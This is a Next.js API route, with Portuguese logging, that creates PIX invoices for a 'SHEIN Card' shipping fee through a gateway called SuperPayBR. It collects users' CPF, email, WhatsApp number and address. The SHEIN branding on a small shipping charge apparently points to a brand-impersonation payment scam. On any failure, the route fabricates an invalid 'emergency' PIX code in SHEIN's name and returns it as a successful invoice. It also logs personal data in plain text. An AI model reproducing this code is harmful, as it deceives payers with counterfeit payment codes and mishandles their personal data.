import { type NextRequest, NextResponse } from "next/server"

const SUPERPAYBR_API_URL = process.env.SUPERPAYBR_API_URL || "https://api.superpaybr.com"
const SUPERPAYBR_TOKEN = process.env.SUPERPAYBR_TOKEN
const SUPERPAYBR_SECRET_KEY = process.env.SUPERPAYBR_SECRET_KEY

interface CreateInvoiceRequest {
  amount: number
  shipping: string
  method: string
}

export async function POST(request: NextRequest) {
  let body: CreateInvoiceRequest | undefined
  try {
    console.log("🚀 CRIANDO FATURA SUPERPAYBR - INÍCIO")

    body = await request.json()
    const { amount, shipping, method } = body

    // Obter dados do usuário dos headers
    const cpfDataHeader = request.headers.get("x-cpf-data")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
    const deliveryAddressHeader = request.headers.get("x-delivery-address")

    let cpfData = {}
    let deliveryAddress = {}

    try {
      cpfData = cpfDataHeader ? JSON.parse(cpfDataHeader) : {}
      deliveryAddress = deliveryAddressHeader ? JSON.parse(deliveryAddressHeader) : {}
    } catch (error) {
      console.log("⚠️ Erro ao parsear dados do usuário:", error)
    }

    console.log("📋 Dados recebidos:")
    console.log("- Valor:", amount)
    console.log("- Método:", method)
    console.log("- Cliente:", (cpfData as any).nome || "N/A")
    console.log("- Email:", userEmail)
    console.log("- WhatsApp:", userWhatsApp)

    // Gerar external_id único
    const timestamp = Date.now()
    const randomSuffix = Math.random().toString(36).substr(2, 9)
    const externalId = `SHEIN_${timestamp}_${randomSuffix}`

    console.log("🆔 External ID gerado:", externalId)

    // Verificar se temos as credenciais necessárias
    if (!SUPERPAYBR_TOKEN || !SUPERPAYBR_SECRET_KEY) {
      console.log("❌ Credenciais SuperPayBR não encontradas - usando PIX de emergência")
      return createEmergencyResponse(Number(body?.amount || 27.97), externalId)
    }

    // Preparar dados da fatura
    const invoiceData = {
      external_id: externalId,
      amount: Math.round(amount * 100), // Converter para centavos
      currency: "BRL",
      payment_method: "pix",
      customer: {
        name: (cpfData as any).nome || "Cliente",
        email: userEmail || "cliente@exemplo.com",
        phone: userWhatsApp || "",
        document: (cpfData as any).cpf || "",
      },
      description: `Frete ${method} - Cartão SHEIN`,
      webhook_url: `${request.nextUrl.origin}/api/superpaybr/webhook`,
      expires_at: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString(), // 2 horas
      metadata: {
        shipping_method: method,
        shipping_type: shipping,
        product: "SHEIN Card",
        customer_name: (cpfData as any).nome,
        customer_email: userEmail,
        customer_whatsapp: userWhatsApp,
        delivery_address: JSON.stringify(deliveryAddress),
      },
    }

    console.log("📦 Dados da fatura SuperPayBR:")
    console.log(JSON.stringify(invoiceData, null, 2))

    // Fazer requisição para SuperPayBR
    const response = await fetch(`${SUPERPAYBR_API_URL}/v1/invoices`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${SUPERPAYBR_TOKEN}`,
        "X-Secret-Key": SUPERPAYBR_SECRET_KEY,
      },
      body: JSON.stringify(invoiceData),
    })

    const responseData = await response.json()

    console.log("📡 Resposta SuperPayBR:")
    console.log("Status:", response.status)
    console.log("Data:", JSON.stringify(responseData, null, 2))

    if (response.ok && responseData.success) {
      console.log("✅ Fatura SuperPayBR criada com sucesso!")

      // Estruturar resposta padronizada
      const invoiceResponse = {
        id: responseData.data.id,
        invoice_id: responseData.data.invoice_id || responseData.data.id,
        external_id: externalId,
        pix: {
          payload: responseData.data.pix?.payload || responseData.data.qr_code_text || "",
          image: responseData.data.pix?.image || "/placeholder.svg?height=250&width=250",
          qr_code:
            responseData.data.pix?.qr_code ||
            responseData.data.qr_code_url ||
            `https://quickchart.io/qr?text=${encodeURIComponent(responseData.data.pix?.payload || responseData.data.qr_code_text || "")}&size=200&margin=1&format=png`,
        },
        status: {
          code: responseData.data.status?.code || 1,
          title: responseData.data.status?.title || "Aguardando Pagamento",
          text: responseData.data.status?.text || "pending",
        },
        valores: {
          bruto: responseData.data.amount || Math.round(amount * 100),
          liquido: responseData.data.amount || Math.round(amount * 100),
        },
        vencimento: {
          dia: responseData.data.expires_at || new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "real" as const,
        webhook_url: invoiceData.webhook_url,
        customer: invoiceData.customer,
        metadata: invoiceData.metadata,
      }

      return NextResponse.json({
        success: true,
        data: invoiceResponse,
        message: "Fatura SuperPayBR criada com sucesso",
        debug: {
          external_id: externalId,
          webhook_url: invoiceData.webhook_url,
          api_response: responseData,
        },
      })
    } else {
      console.log("❌ Erro na API SuperPayBR:", responseData)
      throw new Error(responseData.message || "Erro na API SuperPayBR")
    }
  } catch (error) {
    console.error("❌ Erro ao criar fatura SuperPayBR:", error)

    // Fallback para PIX de emergência
    const timestamp = Date.now()
    const randomSuffix = Math.random().toString(36).substr(2, 9)
    const externalId = `EMERGENCY_${timestamp}_${randomSuffix}`

    return createEmergencyResponse(Number(body?.amount || 27.97), externalId)
  }
}

function createEmergencyResponse(amount: number, externalId: string) {
  console.log("🚨 Criando PIX de emergência...")

  const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.quickchart.io/qr/v2/EMERGENCY${Date.now()}520400005303986540${amount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`

  const emergencyInvoice = {
    id: externalId,
    invoice_id: `EMERGENCY_${Date.now()}`,
    external_id: externalId,
    pix: {
      payload: emergencyPix,
      image: "/placeholder.svg?height=250&width=250",
      qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200&margin=1&format=png`,
    },
    status: {
      code: 1,
      title: "Aguardando Pagamento",
      text: "pending",
    },
    valores: {
      bruto: Math.round(amount * 100),
      liquido: Math.round(amount * 100),
    },
    vencimento: {
      dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
    },
    type: "emergency" as const,
  }

  return NextResponse.json({
    success: true,
    data: emergencyInvoice,
    message: "PIX de emergência criado",
    debug: {
      external_id: externalId,
      type: "emergency_fallback",
    },
  })
}
